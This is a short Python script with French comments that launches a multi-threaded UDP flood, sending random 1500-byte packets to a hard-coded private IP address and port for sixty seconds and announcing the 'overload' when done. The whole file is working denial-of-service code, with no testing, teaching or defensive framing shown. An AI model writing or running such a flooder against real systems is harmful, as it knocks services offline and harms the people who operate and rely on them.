import socket
import threading
import time
import os

TARGET_IP = "192.168.99.228"
TARGET_PORT = 5000
MESSAGE_SIZE = 1500  # MTU max
THREAD_COUNT = 10  # Nombre de threads simultanés
DURATION = 60  # Durée en secondes

def send_packets():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = os.urandom(MESSAGE_SIZE)
    end_time = time.time() + DURATION
    while time.time() < end_time:
        sock.sendto(message, (TARGET_IP, TARGET_PORT))

if __name__ == "__main__":
    print(f"Lancement de {THREAD_COUNT} threads de flood UDP vers {TARGET_IP} pendant {DURATION} secondes.")
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=send_packets)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Surcharge terminée.")
